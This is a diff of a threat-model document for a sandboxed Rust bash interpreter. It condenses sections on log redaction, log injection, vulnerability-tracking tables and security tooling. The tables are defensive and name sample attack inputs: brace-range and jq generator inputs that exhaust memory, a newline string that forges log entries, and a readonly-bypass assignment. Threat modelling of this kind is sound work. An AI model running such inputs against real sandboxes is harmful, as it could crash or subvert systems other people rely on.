-// Default configuration redacts sensitive data (TM-LOG-001 to TM-LOG-004)
-let config = LogConfig::new();
-
-// Redacts env vars matching: PASSWORD, SECRET, TOKEN, KEY, etc.
-assert!(config.should_redact_env("DATABASE_PASSWORD"));
-
-// Redacts URL credentials
-assert_eq!(
-    config.redact_url("https://user:pass@host.com"),
-    "https://[REDACTED]@host.com"
-);
-
-// Detects API keys and JWTs
-assert_eq!(config.redact_value("sk-1234567890abcdef"), "[REDACTED]");
-```
-
-**Caller Warning**: Using `LogConfig::unsafe_disable_redaction()` or
-`LogConfig::unsafe_log_scripts()` may expose sensitive data in logs.
+**Caller Warning**: `LogConfig::unsafe_disable_redaction()` / `unsafe_log_scripts()` may
+expose sensitive data in logs.
 
 #### 9.2 Log Injection
 
@@ -1156,15 +891,8 @@ assert_eq!(config.redact_value("sk-1234567890abcdef"), "[REDACTED]");
 | TM-LOG-005 | Newline injection | Script contains `\n[ERROR] fake` | Newline escaping | **MITIGATED** |
 | TM-LOG-006 | Control char injection | ANSI escape sequences in logs | Control char filtering | **MITIGATED** |
 
-**Current Risk**: LOW - Log content is sanitized
-
-**Implementation**: `logging::sanitize_for_log()` escapes dangerous characters:
-```rust
-// TM-LOG-005: Newlines escaped to prevent fake log entries
-let input = "normal\n[ERROR] injected";
-let sanitized = sanitize_for_log(input);
-// Result: "normal\\n[ERROR] injected"
-```
+**Current Risk**: LOW. Implementation: `logging::sanitize_for_log()` escapes newlines
+(preventing fake log entries, TM-LOG-005) and filters control chars (TM-LOG-006).
 
 #### 9.3 Log Volume Attacks
 
@@ -1173,35 +901,14 @@ let sanitized = sanitize_for_log(input);
 | TM-LOG-007 | Log flooding | Script generates excessive output → many logs | Value truncation | **MITIGATED** |
 | TM-LOG-008 | Large value DoS | Log very long strings | `max_value_length` limit (200) | **MITIGATED** |
 
-**Current Risk**: LOW - Log values are truncated
-
-**Implementation**: `LogConfig` limits value lengths:
-```rust
-// TM-LOG-008: Values truncated to prevent memory exhaustion
-let config = LogConfig::new().max_value_length(200);
-let long_value = "a".repeat(1000);
-let truncated = config.truncate(&long_value);
-// Result: "aaa...[truncated 800 bytes]"
-```
+**Current Risk**: LOW. Implementation: `LogConfig::truncate()` caps values at
+`max_value_length` (TM-LOG-008).
 
 #### 9.4 Logging Security Configuration
 
-**Secure Defaults** (TM-LOG-001 to TM-LOG-008):
-```rust
-let config = LogConfig::new();
-// - redact_sensitive: true (default)
-// - log_script_content: false (default)
-// - log_file_contents: false (default)
-// - max_value_length: 200 (default)
-```
-
-**Custom Redaction Patterns**:
-```rust
-// Add custom env var patterns to redact
-let config = LogConfig::new()
-    .redact_env("MY_CUSTOM_SECRET")
-    .redact_env("INTERNAL_TOKEN");
-```
+**Secure Defaults** (TM-LOG-001 to TM-LOG-008): `LogConfig::new()` — `redact_sensitive: true`,
+`log_script_content: false`, `log_file_contents: false`, `max_value_length: 200`. Custom
+patterns via `.redact_env("MY_CUSTOM_SECRET")`.
 
 ### 9.5 Snapshot Security
 
@@ -1299,54 +1006,54 @@ This section maps former vulnerability IDs to the new threat ID scheme and track
 | Threat ID | Vulnerability | Impact | Recommendation |
 |-----------|---------------|--------|----------------|
 | ~~TM-DOS-029~~ | ~~Arithmetic overflow/panic~~ | ~~Interpreter crash/hang~~ | ~~Use wrapping arithmetic, clamp shift/exponent~~ (**FIXED**) |
-| ~~TM-ESC-012~~ | ~~VFS limit bypass via add_file()/restore()~~ | ~~Unlimited VFS writes~~ | ~~Add limit checks or restrict visibility~~ — `validate_path` + `check_write_limits` now run on both paths (**FIXED**) |
-| ~~TM-INJ-009~~ | ~~Internal variable namespace injection~~ | ~~Bypass readonly, manipulate interpreter~~ | ~~Separate internal state HashMap~~ — `is_internal_variable()` check on every write path (**FIXED**) |
+| ~~TM-ESC-012~~ | ~~VFS limit bypass via add_file()/restore()~~ | ~~Unlimited VFS writes~~ | `validate_path` + `check_write_limits` on both paths (**FIXED**) |
+| ~~TM-INJ-009~~ | ~~Internal variable namespace injection~~ | ~~Bypass readonly, manipulate interpreter~~ | `is_internal_variable()` check on every write path (**FIXED**) |
 | ~~TM-INJ-012–015~~ | ~~Builtin bypass of is_internal_variable()~~ | ~~Unauthorized nameref/case attr injection via declare/readonly/local/export~~ | ~~Add is_internal_variable() check to all builtin insert paths~~ (**FIXED**) |
 | ~~TM-DOS-043~~ | ~~Arithmetic panic in compound assignment~~ | ~~Process crash (DoS) in debug mode~~ | ~~wrapping_* ops in execute_arithmetic_with_side_effects~~ (**FIXED**) |
-| ~~TM-DOS-044~~ | ~~Lexer stack overflow on nested $()~~ | ~~Process crash (SIGABRT)~~ | ~~Depth tracking in read_command_subst_into~~ — bounded; nested-subst tests pass at depth 50 (**FIXED**) |
+| ~~TM-DOS-044~~ | ~~Lexer stack overflow on nested $()~~ | ~~Process crash (SIGABRT)~~ | Depth tracking in `read_command_subst_into`; nested-subst tests pass at depth 50 (**FIXED**) |
 
 ### Open (High Priority)
 
 | Threat ID | Vulnerability | Impact | Recommendation |
 |-----------|---------------|--------|----------------|
-| ~~TM-DOS-031~~ | ~~ExtGlob exponential blowup~~ | ~~CPU exhaustion / stack overflow~~ | ~~Add fuel counter to glob_match_impl~~ — recursion-depth cap in `glob_match_impl` (**FIXED**) |
+| ~~TM-DOS-031~~ | ~~ExtGlob exponential blowup~~ | ~~CPU exhaustion / stack overflow~~ | Recursion-depth cap in `glob_match_impl` (**FIXED**) |
 | ~~TM-DOS-041~~ | ~~Brace expansion unbounded range~~ | ~~OOM DoS~~ | ~~Cap range size in try_expand_range()~~ (**FIXED**) |
-| ~~TM-DOS-032~~ | ~~Tokio runtime per sync call (Python)~~ | ~~OS thread/fd exhaustion~~ | ~~Shared runtime~~ — `Arc<Runtime>` per `PyBash`/`BashTool` instance (**FIXED**) |
-| ~~TM-PY-023~~ | ~~Shell injection in deepagents.py~~ | ~~Command injection within VFS~~ | ~~Use shlex.quote() or direct API~~ — `shlex.quote` on every interpolated path (**FIXED**) |
-| ~~TM-PY-024~~ | ~~Heredoc content injection in write()~~ | ~~Command injection within VFS~~ | ~~Random delimiter or direct API~~ — `BASHKIT_EOF_<token_hex(8)>` per call (**FIXED**) |
-| ~~TM-PY-025~~ | ~~GIL deadlock in execute_sync~~ | ~~Python process deadlock~~ | ~~py.allow_threads()~~ — every `rt.block_on` in lib.rs now releases the GIL via `Python::allow_threads` (**FIXED**) |
+| ~~TM-DOS-032~~ | ~~Tokio runtime per sync call (Python)~~ | ~~OS thread/fd exhaustion~~ | `Arc<Runtime>` per `PyBash`/`BashTool` instance (**FIXED**) |
+| ~~TM-PY-023~~ | ~~Shell injection in deepagents.py~~ | ~~Command injection within VFS~~ | `shlex.quote` on every interpolated path (**FIXED**) |
+| ~~TM-PY-024~~ | ~~Heredoc content injection in write()~~ | ~~Command injection within VFS~~ | `BASHKIT_EOF_<token_hex(8)>` per call (**FIXED**) |
+| ~~TM-PY-025~~ | ~~GIL deadlock in execute_sync~~ | ~~Python process deadlock~~ | Every `rt.block_on` in lib.rs releases the GIL via `Python::allow_threads` (**FIXED**) |
 | TM-ISO-004 | ~~Cross-session env pollution via jq~~ | ~~Session isolation breach~~ | ~~Same fix as TM-INF-013~~ (**FIXED**) |
-| ~~TM-ESC-013~~ | ~~OverlayFs upper() exposes unlimited FS~~ | ~~VFS limit bypass~~ | ~~Restrict upper() visibility~~ — upper now mirrors overlay limits (**FIXED**) |
+| ~~TM-ESC-013~~ | ~~OverlayFs upper() exposes unlimited FS~~ | ~~VFS limit bypass~~ | Upper layer mirrors overlay limits (**FIXED**) |
 
 ### Open (Medium Priority)
 
 | Threat ID | Vulnerability | Impact | Recommendation |
 |-----------|---------------|--------|----------------|
-| ~~TM-DOS-051~~ | ~~YAML parser unbounded recursion~~ | ~~Stack overflow on deeply nested YAML~~ | ~~Add depth parameter to parse_yaml_block/map/list~~ — `depth` arg + `MAX_YAML_DEPTH = 100` cap (**FIXED**) |
-| ~~TM-DOS-052~~ | ~~Template engine unbounded recursion~~ | ~~Stack overflow on deeply nested templates~~ | ~~Add depth parameter to render_template~~ — `depth` arg + `MAX_TEMPLATE_DEPTH = 100` cap (**FIXED**) |
+| ~~TM-DOS-051~~ | ~~YAML parser unbounded recursion~~ | ~~Stack overflow on deeply nested YAML~~ | `depth` arg + `MAX_YAML_DEPTH = 100` cap (**FIXED**) |
+| ~~TM-DOS-052~~ | ~~Template engine unbounded recursion~~ | ~~Stack overflow on deeply nested templates~~ | `depth` arg + `MAX_TEMPLATE_DEPTH = 100` cap (**FIXED**) |
 | ~~TM-DOS-054~~ | ~~`glob --files` ExtGlob blowup~~ | ~~CPU exhaustion (same as TM-DOS-031)~~ | ~~Fix TM-DOS-031 covers this~~ (**FIXED**) |
-| ~~TM-INJ-017~~ | ~~Unzip path traversal within VFS~~ | ~~Arbitrary VFS file overwrite~~ | ~~Validate paths stay within extract_base~~ — `validate_extract_entry_path` rejects non-`Normal` components (**FIXED**) |
-| ~~TM-INJ-018~~ | ~~Dotenv internal variable injection~~ | ~~Bypass readonly, manipulate interpreter~~ | ~~Add is_internal_variable() check~~ — `Dotenv::execute` skips internal-prefix keys (**FIXED**) |
+| ~~TM-INJ-017~~ | ~~Unzip path traversal within VFS~~ | ~~Arbitrary VFS file overwrite~~ | `validate_extract_entry_path` rejects non-`Normal` components (**FIXED**) |
+| ~~TM-INJ-018~~ | ~~Dotenv internal variable injection~~ | ~~Bypass readonly, manipulate interpreter~~ | `Dotenv::execute` skips internal-prefix keys (**FIXED**) |
 | TM-INF-001 | Env vars may leak secrets | Information disclosure | Document caller responsibility |
 | TM-INJ-008 | Terminal escapes in output | UI manipulation | Document sanitization need |
-| ~~TM-INJ-010~~ | ~~Tar path traversal within VFS~~ | ~~Arbitrary VFS file overwrite~~ | ~~Validate paths stay within extract_base~~ — archive.rs rejects entries that don't `starts_with(&extract_base)` (**FIXED**) |
-| ~~TM-GIT-014~~ | ~~Git branch name path injection~~ | ~~VFS git repo corruption~~ | ~~Validate branch names~~ — `validate_ref_name` in `git/client.rs` (**FIXED**) |
+| ~~TM-INJ-010~~ | ~~Tar path traversal within VFS~~ | ~~Arbitrary VFS file overwrite~~ | archive.rs rejects entries that don't `starts_with(&extract_base)` (**FIXED**) |
+| ~~TM-GIT-014~~ | ~~Git branch name path injection~~ | ~~VFS git repo corruption~~ | `validate_ref_name` in `git/client.rs` (**FIXED**) |
 | TM-INF-014 | Real PID leak via $$ | Host information disclosure | Return virtual PID |
-| ~~TM-INF-015~~ | ~~URL credentials in error messages~~ | ~~Credential leak~~ | ~~Apply URL redaction~~ — `network/allowlist.rs::redact_url` (**FIXED**) |
+| ~~TM-INF-015~~ | ~~URL credentials in error messages~~ | ~~Credential leak~~ | `network/allowlist.rs::redact_url` (**FIXED**) |
 | TM-INF-016 | Internal state in error messages | Info leak (paths, IPs, TLS) | Consistent Display format |
 | TM-DOS-034 | ~~TOCTOU in append_file~~ | ~~VFS size limit bypass~~ | ~~Single write lock~~ (**FIXED**) |
-| ~~TM-ISO-005~~ | ~~Session-level cumulative counter bypass~~ | ~~Unbounded aggregate resources across exec() calls~~ | ~~Session-level counters~~ — `SessionLimits` struct (**FIXED**) |
-| ~~TM-ISO-006~~ | ~~No per-instance variable/memory budget~~ | ~~Process OOM via unbounded HashMap growth~~ | ~~MemoryLimits struct~~ — `MemoryLimits` struct (**FIXED**) |
+| ~~TM-ISO-005~~ | ~~Session-level cumulative counter bypass~~ | ~~Unbounded aggregate resources across exec() calls~~ | `SessionLimits` struct (**FIXED**) |
+| ~~TM-ISO-006~~ | ~~No per-instance variable/memory budget~~ | ~~Process OOM via unbounded HashMap growth~~ | `MemoryLimits` struct (**FIXED**) |
 | ~~TM-DOS-035~~ | ~~OverlayFs limit check upper-only~~ | ~~Combined size limit bypass~~ | ~~Use compute_usage()~~ (**FIXED**) |
 | ~~TM-DOS-036~~ | ~~OverlayFs usage double-count~~ | ~~Premature limit rejections~~ | ~~Subtract overrides~~ (**FIXED**) |
 | ~~TM-DOS-037~~ | ~~OverlayFs chmod CoW bypass~~ | ~~Limit bypass via chmod~~ | ~~Route through check_write_limits~~ (**FIXED**) |
 | ~~TM-DOS-038~~ | ~~OverlayFs incomplete whiteout~~ | ~~Deleted files remain visible~~ | ~~Check ancestor whiteouts~~ (**FIXED**) |
-| ~~TM-DOS-039~~ | ~~Missing validate_path in VFS~~ | ~~Path validation gaps~~ | ~~Add to all methods~~ — `validate_path()` in every InMemoryFs / OverlayFs / MountableFs method (**FIXED**) |
+| ~~TM-DOS-039~~ | ~~Missing validate_path in VFS~~ | ~~Path validation gaps~~ | `validate_path()` in every InMemoryFs / OverlayFs / MountableFs method (**FIXED**) |
 | TM-ESC-014 | ~~Custom builtins lost after first call~~ | ~~Security wrappers silently removed~~ | ~~Clone or Arc builtins~~ (**FIXED**) |
-| ~~TM-PY-026~~ | ~~reset() discards security config~~ | ~~DoS protections removed~~ | ~~Preserve config on reset~~ — `PyBash::reset` and `BashTool::reset` rebuild via `replace_live_bash_with_builder` (**FIXED**) |
-| ~~TM-INJ-011~~ | ~~Cyclic nameref silent resolution~~ | ~~Read/write unintended variables~~ | ~~Detect cycles, error~~ — `resolve_nameref()` detects cycles via visited-set and returns original name (**FIXED**) |
-| ~~TM-PY-027~~ | ~~py_to_json unbounded recursion~~ | ~~Stack overflow~~ | ~~Add depth counter~~ — `MAX_NESTING_DEPTH = 64` enforced in `json_to_py_inner` / `py_to_json_inner` / MontyObject converters (**FIXED**) |
-| ~~TM-DOS-040~~ | ~~Integer truncation on 32-bit~~ | ~~Size check bypass~~ | ~~Use try_from()~~ — `usize::try_from(...).unwrap_or(usize::MAX)` (**FIXED**) |
+| ~~TM-PY-026~~ | ~~reset() discards security config~~ | ~~DoS protections removed~~ | `PyBash::reset` / `BashTool::reset` rebuild via `replace_live_bash_with_builder` (**FIXED**) |
+| ~~TM-INJ-011~~ | ~~Cyclic nameref silent resolution~~ | ~~Read/write unintended variables~~ | `resolve_nameref()` visited-set cycle detection (**FIXED**) |
+| ~~TM-PY-027~~ | ~~py_to_json unbounded recursion~~ | ~~Stack overflow~~ | `MAX_NESTING_DEPTH = 64` in `json_to_py_inner` / `py_to_json_inner` / MontyObject converters (**FIXED**) |
+| ~~TM-DOS-040~~ | ~~Integer truncation on 32-bit~~ | ~~Size check bypass~~ | `usize::try_from(...).unwrap_or(usize::MAX)` (**FIXED**) |
 | TM-UNI-001 | Awk parser byte-boundary panic on Unicode | Silent builtin failure on valid input | Fix awk parser to use char-boundary-safe indexing |
 | TM-UNI-002 | Sed parser byte-boundary issues | Silent builtin failure on valid input | Audit and fix sed byte-indexing |
 | ~~TM-UNI-003~~ | ~~Zero-width chars in filenames~~ | ~~Invisible/confusable filenames~~ | ~~Extend `find_unsafe_path_char()`~~ (**FIXED**) |
@@ -1361,45 +1068,45 @@ This section maps former vulnerability IDs to the new threat ID scheme and track
 
 | Threat ID | Vulnerability | Impact | Recommendation |
 |-----------|---------------|--------|----------------|
-| ~~TM-INJ-012~~ | ~~`declare` bypasses `is_internal_variable()`~~ | ~~Unauthorized nameref creation, case conversion injection~~ | ~~Route declare assignments through `set_variable()` or add `is_internal_variable()` check~~ (**FIXED**) |
+| ~~TM-INJ-012~~ | ~~`declare` bypasses `is_internal_variable()`~~ | ~~Unauthorized nameref creation, case conversion injection~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
 | ~~TM-INJ-013~~ | ~~`readonly` bypasses `is_internal_variable()`~~ | ~~Unauthorized nameref creation via `readonly _NAMEREF_x=target`~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
 | ~~TM-INJ-014~~ | ~~`local` bypasses `is_internal_variable()`~~ | ~~Internal prefix injection in function scope~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
 | ~~TM-INJ-015~~ | ~~`export` bypasses `is_internal_variable()`~~ | ~~Internal prefix injection via export~~ | ~~Add `is_internal_variable()` check~~ (**FIXED**) |
 | ~~TM-INJ-016~~ | ~~`_ARRAY_READ_` prefix not in `is_internal_variable()`~~ | ~~Arbitrary array creation/overwrite via marker injection~~ | ~~Add `_ARRAY_READ_` prefix to `is_internal_variable()`~~ (**FIXED**) |
 | TM-INF-017 | `set` and `declare -p` leak internal markers | Internal state disclosure (_NAMEREF_, _READONLY_, _UPPER_, _LOWER_) | Filter `is_internal_variable()` names from output |
-| TM-INF-018 | `date` builtin returns real host time | Timezone fingerprinting, timing correlation | `Bash::builder().fixed_epoch(N)` freezes the clock; `Bash::builder().epoch_offset(N)` shifts real-clock by N seconds (mutually exclusive, last call wins). Both implemented via `Date::with_fixed_epoch` / `Date::with_offset_seconds` in `builtins/date.rs`. Default behavior is real clock — embed callers opt in for sandboxing. Regression tests: `tm_inf_018_date::*` in `tests/threat_model_tests.rs`. | **MITIGATED** (opt-in) |
-| ~~TM-DOS-041~~ | ~~Brace expansion `{N..M}` unbounded range~~ | ~~OOM via `{1..999999999}` allocating billions of strings~~ | Static parser-time check (`MAX_STATIC_BRACE_RANGE = 100_000` in `parser/budget.rs`) rejects oversized literal ranges with `BraceRangeTooLarge`; runtime fallback in `try_expand_range` (`MAX_BRACE_RANGE = 10_000`) treats remaining oversized ranges as literals (**FIXED**) |
+| TM-INF-018 | `date` builtin returns real host time | Timezone fingerprinting, timing correlation | `Bash::builder().fixed_epoch(N)` freezes the clock; `.epoch_offset(N)` shifts it (mutually exclusive, last call wins) via `Date::with_fixed_epoch` / `Date::with_offset_seconds` in `builtins/date.rs`. Default is real clock — callers opt in for sandboxing. Regression tests: `tm_inf_018_date::*` in `tests/threat_model_tests.rs`. | **MITIGATED** (opt-in) |
+| ~~TM-DOS-041~~ | ~~Brace expansion `{N..M}` unbounded range~~ | ~~OOM via `{1..999999999}`~~ | `MAX_STATIC_BRACE_RANGE = 100_000` parser-time check (`parser/budget.rs`, `BraceRangeTooLarge`); runtime fallback `MAX_BRACE_RANGE = 10_000` in `try_expand_range` treats oversized ranges as literals (**FIXED**) |
 | ~~TM-DOS-042~~ | ~~Brace expansion combinatorial explosion~~ | ~~OOM/stack overflow via `{1..100}{1..100}{1..100}` (1M strings) or `{a,b}{a,b}...` (deep recursion)~~ | `expand_braces` caps total emitted strings (`MAX_BRACE_EXPANSION_TOTAL = 100_000`). The count cap alone was insufficient for comma-lists: it is only charged on recursion *return*, so the first DFS path descended one frame per group with the count still zero and stack-overflowed. Now also bounds recursion depth and cumulative output bytes (`MAX_EXPANSION_RESULT_BYTES`) so it degrades to a bounded literal result (**FIXED**) |
 | ~~TM-DOS-043~~ | ~~Arithmetic overflow in `execute_arithmetic_with_side_effects`~~ | ~~Panic (DoS) in debug mode via `((x+=1))` with x=i64::MAX~~ | ~~Use `wrapping_add/sub/mul`~~ (**FIXED**) |
 | ~~TM-DOS-044~~ | ~~Lexer `read_command_subst_into` stack overflow~~ | ~~Process crash (SIGABRT) via ~50 nested `$()` in double-quotes~~ | ~~Add depth parameter to `read_command_subst_into()`~~ (**FIXED**) |
-| ~~TM-DOS-045~~ | ~~OverlayFs `symlink()` bypasses all limits~~ | ~~Unlimited symlink creation despite `max_file_count`~~ | ~~Add `check_write_limits()` + `validate_path()` to symlink~~ — overlay symlink path enforces limits (**FIXED**) |
-| ~~TM-DOS-046~~ | ~~MountableFs has zero `validate_path()` calls~~ | ~~Path validation completely bypassed for mounted filesystems~~ | ~~Add `validate_path()` to all FileSystem methods~~ — `MountableFs::validate_path` runs before every delegation (**FIXED**) |
+| ~~TM-DOS-045~~ | ~~OverlayFs `symlink()` bypasses all limits~~ | ~~Unlimited symlink creation despite `max_file_count`~~ | `check_write_limits()` + `validate_path()` in symlink path (**FIXED**) |
+| ~~TM-DOS-046~~ | ~~MountableFs has zero `validate_path()` calls~~ | ~~Path validation completely bypassed for mounted filesystems~~ | `MountableFs::validate_path` runs before every delegation (**FIXED**) |
 | ~~TM-DOS-047~~ | ~~InMemoryFs `copy()` skips limit check when dest exists~~ | ~~Total VFS bytes can exceed `max_total_bytes`~~ | ~~Always call `check_write_limits()`, accounting for size delta~~ (**FIXED**) |
 | ~~TM-DOS-048~~ | ~~InMemoryFs `rename()` overwrites dirs, orphans children~~ | ~~VFS corruption — orphaned entries consume memory but are unreachable~~ | ~~Check dest type in `rename()`, reject file-over-directory per POSIX~~ (**FIXED**) |
-| ~~TM-DOS-049~~ | ~~`collect_dirs_recursive` has no depth limit~~ | ~~Deep recursion on VFS trees~~ | ~~Add explicit depth parameter~~ — capped using `FsLimits::max_path_depth` (**FIXED**) |
+| ~~TM-DOS-049~~ | ~~`collect_dirs_recursive` has no depth limit~~ | ~~Deep recursion on VFS trees~~ | Capped using `FsLimits::max_path_depth` (**FIXED**) |
 | ~~TM-DOS-050~~ | ~~`parse_word_string` uses default parser limits~~ | ~~Caller-configured tighter limits ignored for parameter expansion~~ | ~~Propagate limits through `parse_word_string()`~~ (**FIXED**) |
-| ~~TM-PY-028~~ | ~~BashTool.reset() in Python drops security config~~ | ~~Resource limits silently removed after reset~~ | ~~Preserve limits like `PyBash.reset()` does~~ — `BashTool::reset` rebuilds via `replace_live_bash_with_builder` matching `PyBash::reset` (**FIXED**) |
+| ~~TM-PY-028~~ | ~~BashTool.reset() in Python drops security config~~ | ~~Resource limits silently removed after reset~~ | `BashTool::reset` rebuilds via `replace_live_bash_with_builder` matching `PyBash::reset` (**FIXED**) |
 | TM-PY-029 | ContextVar capture may include sensitive state | `copy_context()` snapshots all caller ContextVars, not just intended ones | Accepted: same semantics as `asyncio.Task` context inheritance; caller controls what is set |
 
 ### Open (From 2026-03 Blackbox Security Testing)
 
 | Threat ID | Vulnerability | Impact | Recommendation |
 |-----------|---------------|--------|----------------|
-| ~~TM-DOS-056~~ | ~~`source` self-recursion stack overflow~~ | ~~Process crash (SIGABRT) via script that sources itself~~ | ~~Track source depth like function depth; apply `max_function_depth` limit~~ (**FIXED**) |
-| ~~TM-DOS-057~~ | ~~`sleep` bypasses execution timeout~~ | ~~CPU/time exhaustion; `sleep`, subshell sleep, pipeline sleep, background sleep, `timeout` builtin all ignore `ExecutionLimits::timeout`~~ | ~~Implement timeout as tokio::time::timeout wrapper around exec(), not cooperative check~~ (**FIXED**) |
-| ~~TM-DOS-058~~ | ~~Single-builtin unbounded output~~ | ~~OOM via `seq 1 1000000` producing 1M lines despite command limit of 50~~ | ~~Add `max_stdout_bytes` / `max_stderr_bytes` to ExecutionLimits~~ (**FIXED**) |
+| ~~TM-DOS-056~~ | ~~`source` self-recursion stack overflow~~ | ~~Process crash (SIGABRT)~~ | ~~`source` shares the function call-depth counter~~ (**FIXED**) |
+| ~~TM-DOS-057~~ | ~~`sleep` bypasses execution timeout~~ | ~~CPU/time exhaustion in all sleep forms~~ | ~~`tokio::time::timeout` wrapper around exec(), not cooperative check~~ (**FIXED**) |
+| ~~TM-DOS-058~~ | ~~Single-builtin unbounded output~~ | ~~OOM via `seq 1 1000000`~~ | ~~`max_stdout_bytes` / `max_stderr_bytes` in ExecutionLimits~~ (**FIXED**) |
 | ~~TM-INJ-019~~ | ~~`unset` removes readonly variables~~ | ~~Integrity bypass — readonly protection defeated~~ | ~~Check readonly attribute in unset before removal~~ (**FIXED**) |
 | ~~TM-INJ-020~~ | ~~`declare` overwrites readonly variables~~ | ~~Integrity bypass — `declare X=new` overwrites `readonly X=old`~~ | ~~Check readonly attribute in declare assignment path~~ (**FIXED**) |
 | ~~TM-INJ-021~~ | ~~`export` overwrites readonly variables~~ | ~~Integrity bypass — `export X=new` overwrites `readonly X=old`~~ | ~~Check readonly attribute in export assignment path~~ (**FIXED**) |
-| ~~TM-ISO-021~~ | ~~EXIT trap leaks across `exec()` calls~~ | ~~Cross-invocation interference — trap from exec N fires in exec N+1~~ | ~~Reset traps in `reset_for_execution()`~~ — `reset_transient_state()` clears `traps` (**FIXED**) |
-| ~~TM-ISO-022~~ | ~~`$?` leaks across `exec()` calls~~ | ~~State pollution — exit code from previous exec visible to next exec~~ | ~~Reset `last_exit_code` in `reset_for_execution()`~~ — `reset_transient_state()` zeroes `last_exit_code` (**FIXED**) |
+| ~~TM-ISO-021~~ | ~~EXIT trap leaks across `exec()` calls~~ | ~~Trap from exec N fires in exec N+1~~ | `reset_transient_state()` clears `traps` (**FIXED**) |
+| ~~TM-ISO-022~~ | ~~`$?` leaks across `exec()` calls~~ | ~~Exit code from previous exec visible to next~~ | `reset_transient_state()` zeroes `last_exit_code` (**FIXED**) |
 | TM-ISO-023 | `set -e` leaks across `exec()` calls | Unexpected abort — `set` options from previous exec affect next exec | `SET_OPTION_VARS` cleared in `reset_transient_state()` (**FIXED**) |
-| ~~TM-ISO-024~~ | ~~`$?` leaks into VFS subprocess~~ | ~~Parent `last_exit_code` visible inside VFS script subprocess, causing false `set -e` failures~~ | ~~Reset `last_exit_code = 0` and `nounset_error = None` in `execute_script_content` subprocess isolation~~ (**FIXED**) |
-| ~~TM-INT-007~~ | ~~`/dev/urandom` empty with `head -c`~~ | ~~Weak randomness — `head -c 16 /dev/urandom` returns empty string~~ | ~~Fix virtual device pipe handling in head builtin~~ — `read_file_for_builtin` reads virtual devices as Latin-1 (**FIXED**) |
-| ~~TM-DOS-044~~ | ~~Nested `$()` stack overflow (regression)~~ | ~~Process crash (SIGABRT) at depth ~50 despite #492 fix~~ | ~~Interpreter execution path may need separate depth tracking from lexer fix~~ — depth-50 nested-subst test (`finding_nested_cmd_subst_stack_overflow::depth_50_is_bounded`) passes (**FIXED**) |
+| ~~TM-ISO-024~~ | ~~`$?` leaks into VFS subprocess~~ | ~~False `set -e` failures in VFS script subprocess~~ | `execute_script_content` resets `last_exit_code` / `nounset_error` (**FIXED**) |
+| ~~TM-INT-007~~ | ~~`/dev/urandom` empty with `head -c`~~ | ~~Weak randomness (empty output)~~ | `read_file_for_builtin` reads virtual devices as Latin-1 (**FIXED**) |
+| ~~TM-DOS-044~~ | ~~Nested `$()` stack overflow (regression)~~ | ~~SIGABRT at depth ~50 despite #492 fix~~ | Depth-50 nested-subst test (`finding_nested_cmd_subst_stack_overflow::depth_50_is_bounded`) passes (**FIXED**) |
 | TM-DOS-088 | Command substitution OOM via state cloning | OOM at depth N (memory ≈ N × state_size) | Dedicated `max_subst_depth` limit (default 32), separate from `max_function_depth` — **FIXED** via #1088 |
 | TM-DOS-089 | Command substitution stack overflow via inlined futures | SIGABRT at ~20-30 nested $() levels | Box::pin `expand_word` and `execute_cmd_subst` to cap per-level stack — **FIXED** via #1089 |
-| ~~TM-DOS-090~~ | ~~`shuf` unbounded range/repeat materialization~~ | ~~OOM/CPU exhaustion via huge `--input-range` or `--head-count` before stdout truncation~~ | ~~Sample numeric ranges without full collection and reject output that exceeds `ExecutionLimits` before allocation~~ — `shuf_resource_tests` cover huge range `-n 1` and repeat output caps (**FIXED**) |
+| ~~TM-DOS-090~~ | ~~`shuf` unbounded range/repeat materialization~~ | ~~OOM/CPU via huge `--input-range`/`--head-count` before stdout truncation~~ | Sample ranges without full collection; reject over-limit output pre-allocation; `shuf_resource_tests` cover huge range `-n 1` and repeat caps (**FIXED**) |
 | TM-DOS-091 | SQLite `.dump` cumulative output bypass | `.dump` built the full schema+rows string before checking `max_output_bytes`; an attacker controlling many tables/rows could cause memory to grow far beyond the configured output cap | `bounded_append()` helper enforces the cap after each schema line and each INSERT row; `dispatch()` receives the *remaining* budget (`max_output_bytes - stdout.len()`) from `run_statements` — **FIXED** via #1869 |
 | TM-DOS-092 | Subshell snapshot amplification | Deeply nested `( ... )` keeps CoW state snapshots and call-stack clones alive | `max_subshell_depth` counter (default 32) bounds live explicit subshell snapshots | **MITIGATED** |
 | TM-DOS-093 | jq unbounded generator OOM/hang | `jq -n 'repeat(1)'` / `range(0;1e18)` — the jaq result loop appended every value to an in-memory string with no byte/value/deadline cap; jaq's iterator is synchronous so the async execution timeout cannot preempt it. jq is a core builtin (no opt-in gate) | Cap accumulated output at the caller's `max_stdout_bytes` and poll `ExecutionDeadline::is_expired()` every 4096 values, aborting with a clean error (`builtins/jq/mod.rs`) — **FIXED** |
@@ -1612,15 +1319,8 @@ This section documents the security tools used to detect and prevent vulnerabili
 | **cargo-clippy** | Lint with security-focused warnings | ✅ Required | Every PR |
 | **cargo-geiger** | Count unsafe code blocks | ✅ Informational | Every PR |
 
-**cargo-audit**: Scans `Cargo.lock` against RustSec Advisory Database for known vulnerabilities.
-```bash
-cargo audit
-```
-
-**cargo-geiger**: Tracks unsafe code usage to ensure it remains minimal and audited.
-```bash
-cargo geiger --all-features
-```
+**cargo-audit** scans `Cargo.lock` against the RustSec Advisory Database; **cargo-geiger**
+(`--all-features`) tracks unsafe code usage to keep it minimal and audited.
 
 ### Dynamic Analysis Tools
 
@@ -1630,26 +1330,9 @@ cargo geiger --all-features
 | **Miri** | Undefined behavior detection | ✅ Required | Every PR |
 | **proptest** | Property-based testing | ✅ Required | Every PR |
 
-**cargo-fuzz**: Finds crashes, hangs, and memory issues in parser and interpreter.
-```bash
-cargo +nightly fuzz run parser_fuzz -- -max_total_time=300
-```
-
-**Miri**: Detects undefined behavior in unsafe code blocks.
-```bash
-cargo +nightly miri test --lib
-```
-
-**proptest**: Generates random inputs to test invariants and boundary conditions.
-```rust
-proptest! {
-    #[test]
-    fn parser_handles_arbitrary_input(s in ".*") {
-        // Should not panic on any input
-        let _ = parse(&s);
-    }
-}
-```
+**cargo-fuzz** (`cargo +nightly fuzz run parser_fuzz`) finds crashes/hangs/memory issues in
+parser and interpreter; **Miri** (`cargo +nightly miri test --lib`) detects UB in unsafe code;
+**proptest** generates random inputs to test no-panic invariants and boundary conditions.
 
 ### Memory Safety Tools
 
